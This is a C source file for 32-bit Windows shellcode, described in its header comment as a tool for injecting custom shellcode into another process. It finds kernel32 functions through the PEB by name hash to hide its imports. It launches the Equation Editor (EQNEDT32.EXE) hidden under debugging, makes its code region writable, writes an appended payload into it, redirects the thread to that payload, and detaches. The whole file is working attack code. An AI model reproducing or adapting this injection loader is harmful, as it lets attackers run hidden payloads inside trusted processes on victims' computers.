// Author: unamer
// Shellcode for injecting custom shellcode to other process.

#pragma comment(linker, "/ENTRY:main")
#include <windows.h>
#pragma once

#define MAKESTR(s, length) MAKESTR_##length(s)

/*
for i in range(1,51):
s = "#define MAKESTR_%d(s) {" % i
for j in range(i):
s += "s[%d]," % j
s += "0}"

print(s)
*/

#define MAKESTR_1(s) {s[0],0}
#define MAKESTR_2(s) {s[0],s[1],0}
#define MAKESTR_3(s) {s[0],s[1],s[2],0}
#define MAKESTR_4(s) {s[0],s[1],s[2],s[3],0}
#define MAKESTR_5(s) {s[0],s[1],s[2],s[3],s[4],0}
#define MAKESTR_6(s) {s[0],s[1],s[2],s[3],s[4],s[5],0}
#define MAKESTR_7(s) {s[0],s[1],s[2],s[3],s[4],s[5],s[6],0}
#define MAKESTR_8(s) {s[0],s[1],s[2],s[3],s[4],s[5],s[6],s[7],0}
#define MAKESTR_9(s) {s[0],s[1],s[2],s[3],s[4],s[5],s[6],s[7],s[8],0}
#define MAKESTR_10(s) {s[0],s[1],s[2],s[3],s[4],s[5],s[6],s[7],s[8],s[9],0}
#define MAKESTR_11(s) {s[0],s[1],s[2],s[3],s[4],s[5],s[6],s[7],s[8],s[9],s[10],0}
#define MAKESTR_12(s) {s[0],s[1],s[2],s[3],s[4],s[5],s[6],s[7],s[8],s[9],s[10],s[11],0}

typedef struct _LSA_UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} LSA_UNICODE_STRING, *PLSA_UNICODE_STRING, UNICODE_STRING, *PUNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
	LIST_ENTRY              InLoadOrderModuleList;
	LIST_ENTRY              InMemoryOrderModuleList;
	LIST_ENTRY              InInitializationOrderModuleList;
	PVOID                   BaseAddress;
	PVOID                   EntryPoint;
	ULONG                   SizeOfImage;
	UNICODE_STRING          FullDllName;
	UNICODE_STRING          BaseDllName;
	ULONG                   Flags;
	SHORT                   LoadCount;
	SHORT                   TlsIndex;
	LIST_ENTRY              HashTableEntry;
	ULONG                   TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
	ULONG      Length;
	ULONG      Initialized;
	ULONG      SsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
	BYTE           Reserved1[16];
	PVOID          Reserved2[10];
	UNICODE_STRING ImagePathName;
	UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB {
	BYTE                          Reserved1[2];
	BYTE                          BeingDebugged;
	BYTE                          Reserved2[1];
	PVOID                         Reserved3[2];
	PPEB_LDR_DATA                 Ldr;
	PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
	BYTE                          Reserved4[104];
	PVOID                         Reserved5[52];
	PVOID                         PostProcessInitRoutine;
	BYTE                          Reserved6[128];
	PVOID                         Reserved7[1];
	ULONG                         SessionId;
} PEB, *PPEB;

typedef int (WINAPI *_ExitProcess)(int code);

int main();

typedef BOOL(WINAPI *_DebugSetProcessKillOnExit)(
	_In_ BOOL KillOnExit
	);


typedef BOOL (WINAPI *_SetThreadContext)(
	_In_       HANDLE  hThread,
	_In_ const CONTEXT *lpContext
	);

typedef BOOL (WINAPI *_ContinueDebugEvent)(
	_In_ DWORD dwProcessId,
	_In_ DWORD dwThreadId,
	_In_ DWORD dwContinueStatus
	);

typedef
BOOL (WINAPI* _GetThreadContext)(
_In_    HANDLE    hThread,
_Inout_ LPCONTEXT lpContext
);

typedef BOOL (WINAPI* _WriteProcessMemory)(
	_In_  HANDLE  hProcess,
	_In_  LPVOID  lpBaseAddress,
	_In_  LPCVOID lpBuffer,
	_In_  SIZE_T  nSize,
	_Out_ SIZE_T  *lpNumberOfBytesWritten
	);

typedef BOOL (WINAPI *_VirtualProtectEx)(
	_In_  HANDLE hProcess,
	_In_  LPVOID lpAddress,
	_In_  SIZE_T dwSize,
	_In_  DWORD  flNewProtect,
	_Out_ PDWORD lpflOldProtect
	);

typedef BOOL (WINAPI *_WaitForDebugEvent)(
	_Out_ LPDEBUG_EVENT lpDebugEvent,
	_In_  DWORD         dwMilliseconds
	);

typedef
BOOL(WINAPI *_DebugActiveProcessStop)(
_In_ DWORD dwProcessId
);

typedef BOOL (WINAPI* _CreateProcessA)(
	_In_opt_    LPCSTR               lpApplicationName,
	_Inout_opt_ LPSTR                lpCommandLine,
	_In_opt_    LPSECURITY_ATTRIBUTES lpProcessAttributes,
	_In_opt_    LPSECURITY_ATTRIBUTES lpThreadAttributes,
	_In_        BOOL                  bInheritHandles,
	_In_        DWORD                 dwCreationFlags,
	_In_opt_    LPVOID                lpEnvironment,
	_In_opt_    LPCSTR               lpCurrentDirectory,
	_In_        LPSTARTUPINFOA         lpStartupInfo,
	_Out_       LPPROCESS_INFORMATION lpProcessInformation
	);

DWORD getDllByName(DWORD dllHash);
PVOID getFunctionAddr(DWORD dwModule, DWORD functionHash);
DWORD djbHash(char* str);
DWORD djbHashW(wchar_t* str);
DWORD geteip();

int main() {
	DWORD hashKernel32 = 0x6DDB9555; // djbHashW(L"KERNEL32.DLL");
	DWORD hKernel32 = getDllByName(hashKernel32);
	if (hKernel32 == 0) {
		hKernel32 = getDllByName(0x7040EE75);

		if (!hKernel32)
			return 1;
	}
	DWORD hashExit = 0xb769339e;
	_ExitProcess xExitProcess = (_ExitProcess)getFunctionAddr(hKernel32, hashExit);
	if (xExitProcess == NULL) {
		return 1;
	}

	DWORD hashvtp = 0xd812922a;
	_VirtualProtectEx xVirtualProtectEx = (_VirtualProtectEx)getFunctionAddr(hKernel32, hashvtp);
	if (xVirtualProtectEx == NULL) {
		xExitProcess(0);
	}

	DWORD hashWriteProcessMemory = 0x6f22e8c8;
	_WriteProcessMemory xWriteProcessMemory = (_WriteProcessMemory)getFunctionAddr(hKernel32, hashWriteProcessMemory);
	if (xWriteProcessMemory == NULL) {
		xExitProcess(0);
	}

	DWORD hashGetThreadContext = 0xeba2cfc2;
	_GetThreadContext xGetThreadContext = (_GetThreadContext)getFunctionAddr(hKernel32, hashGetThreadContext);
	if (xGetThreadContext == NULL) {
		xExitProcess(0);
	}

	DWORD hashWaitForDebugEvent = 0xbe7a3faa;
	_WaitForDebugEvent xWaitForDebugEvent = (_WaitForDebugEvent)getFunctionAddr(hKernel32, hashWaitForDebugEvent);
	if (xWaitForDebugEvent == NULL) {
		xExitProcess(0);
	}

	DWORD hashContinueDebugEvent = 0x97f8f4f3;
	_ContinueDebugEvent xContinueDebugEvent = (_ContinueDebugEvent)getFunctionAddr(hKernel32, hashContinueDebugEvent);
	if (xContinueDebugEvent == NULL) {
		xExitProcess(0);
	}

	DWORD hashSetThreadContext = 0x7e20964e;
	_SetThreadContext xSetThreadContext = (_SetThreadContext)getFunctionAddr(hKernel32, hashSetThreadContext);
	if (xSetThreadContext == NULL) {
		xExitProcess(0);
	}

	DWORD hashCreateProcessA = 0xaeb52e19;
	_CreateProcessA xCreateProcessA = (_CreateProcessA)getFunctionAddr(hKernel32, hashCreateProcessA);
	if (xCreateProcessA == NULL) {
		xExitProcess(0);
	}

	DWORD hashDebugSetProcessKillOnExit = 0xbb0c6a5a;
	_DebugSetProcessKillOnExit xDebugSetProcessKillOnExit = (_DebugSetProcessKillOnExit)getFunctionAddr(hKernel32, hashDebugSetProcessKillOnExit);
	if (xDebugSetProcessKillOnExit == NULL) {
		xExitProcess(0);
	}

	DWORD hashDebugActiveProcessStop = 0x8277bf8d;
	_DebugActiveProcessStop xDebugActiveProcessStop = (_DebugActiveProcessStop)getFunctionAddr(hKernel32, hashDebugActiveProcessStop);
	if (xDebugActiveProcessStop == NULL) {
		xExitProcess(0);
	}

	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	RtlSecureZeroMemory(&si, sizeof si);
	RtlSecureZeroMemory(&pi, sizeof pi);

	si.cb = sizeof si;
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;

	char cmd[] = MAKESTR("EQNEDT32.EXE", 12);
	// Create debug process
	if (!xCreateProcessA(0, cmd, 0, 0, 0, DEBUG_ONLY_THIS_PROCESS,0,0,&si,&pi))
	{
		xExitProcess(-1);
	}

	DEBUG_EVENT de;
	RtlSecureZeroMemory(&de, sizeof de);

	HANDLE hProc = 0,hThread=0;

	while (de.dwDebugEventCode != CREATE_PROCESS_DEBUG_EVENT)
	{
		if (!xWaitForDebugEvent(&de,5000))
		{
			xExitProcess(0);
		}
		
		if (de.dwDebugEventCode != CREATE_PROCESS_DEBUG_EVENT)
		{
			xContinueDebugEvent(pi.dwProcessId, pi.dwThreadId, DBG_CONTINUE);
		}
	}

	hProc = de.u.CreateProcessInfo.hProcess;
	hThread = de.u.CreateProcessInfo.hThread;

	DWORD by;
	CONTEXT c;
	RtlSecureZeroMemory(&c, sizeof c);
	c.ContextFlags = CONTEXT_CONTROL;
	if (!xGetThreadContext(hThread,&c))
	{
		xExitProcess(0);
	}
	
	if (!xVirtualProtectEx(hProc,(LPVOID)0x401000,0x5000,PAGE_EXECUTE_READWRITE,&by))
	{
		xExitProcess(0);
	}

	by = 0;
	DWORD ip = geteip()+1;
	DWORD scsize = 0;

	_asm {
		mov eax, ip;
		mov eax, dword ptr[eax];
		mov scsize, eax;
	}
	ip += 4;
	if (!xWriteProcessMemory(hProc,(LPVOID)0x401000,(LPVOID)ip,scsize,&by))
	{
		xExitProcess(0);
	}

	c.Eip = 0x401000;
	if (!xSetThreadContext(hThread,&c))
	{
		xExitProcess(0);
	}

	if (!xDebugSetProcessKillOnExit(0))
	{
		xExitProcess(0);
	}

	if (!xContinueDebugEvent(pi.dwProcessId, pi.dwThreadId, DBG_CONTINUE))
	{
		xExitProcess(0);
	}

	if (!xDebugActiveProcessStop(pi.dwProcessId))
	{
		xExitProcess(0);
	}

	xExitProcess(0);
}

inline PEB* getPeb() {
	__asm {
		mov eax, fs:[0x30];
	}
}

DWORD djbHash(char* str) {
	unsigned int hash = 5381;
	unsigned int i = 0;

	for (i = 0; str[i] != 0; i++) {
		hash = ((hash << 5) + hash) + str[i];
	}

	return hash;
}
DWORD djbHashW(wchar_t* str) {
	unsigned int hash = 5381;
	unsigned int i = 0;

	for (i = 0; str[i] != 0; i++) {
		hash = ((hash << 5) + hash) + str[i];
	}

	return hash;
}

DWORD getDllByName(DWORD dllHash) {
	PEB* peb = getPeb();
	PPEB_LDR_DATA Ldr = peb->Ldr;
	PLDR_DATA_TABLE_ENTRY moduleList = (PLDR_DATA_TABLE_ENTRY)Ldr->InLoadOrderModuleList.Flink;

	wchar_t* pBaseDllName = moduleList->BaseDllName.Buffer;
	wchar_t* pFirstDllName = moduleList->BaseDllName.Buffer;

	do {
		if (pBaseDllName != NULL) {
			if (djbHashW(pBaseDllName) == dllHash) {
				return (DWORD)moduleList->BaseAddress;
			}
		}

		moduleList = (PLDR_DATA_TABLE_ENTRY)moduleList->InLoadOrderModuleList.Flink;
		pBaseDllName = moduleList->BaseDllName.Buffer;
	} while (pBaseDllName != pFirstDllName);

	return 0;
}

PVOID getFunctionAddr(DWORD dwModule, DWORD functionHash) {
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dwModule;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD)dosHeader + dosHeader->e_lfanew);
	PIMAGE_DATA_DIRECTORY dataDirectory = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	if (dataDirectory->VirtualAddress == 0) {
		return NULL;
	}


	PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)(dwModule + dataDirectory->VirtualAddress);
	PDWORD ardwNames = (PDWORD)(dwModule + exportDirectory->AddressOfNames);
	PWORD arwNameOrdinals = (PWORD)(dwModule + exportDirectory->AddressOfNameOrdinals);
	PDWORD ardwAddressFunctions = (PDWORD)(dwModule + exportDirectory->AddressOfFunctions);
	char* szName = 0;
	WORD wOrdinal = 0;

	for (unsigned int i = 0; i < exportDirectory->NumberOfNames; i++) {
		szName = (char*)(dwModule + ardwNames[i]);

		if (djbHash(szName) == functionHash) {
			wOrdinal = arwNameOrdinals[i];
			return (PVOID)(dwModule + ardwAddressFunctions[wOrdinal]);
		}
	}

	return NULL;
}

__declspec(naked) DWORD geteip()
{
	__asm {
		jmp lab1;
	sub1:
		mov eax, dword ptr[esp];
		ret;
	lab1:
		call sub1;
		ret;
	}
}
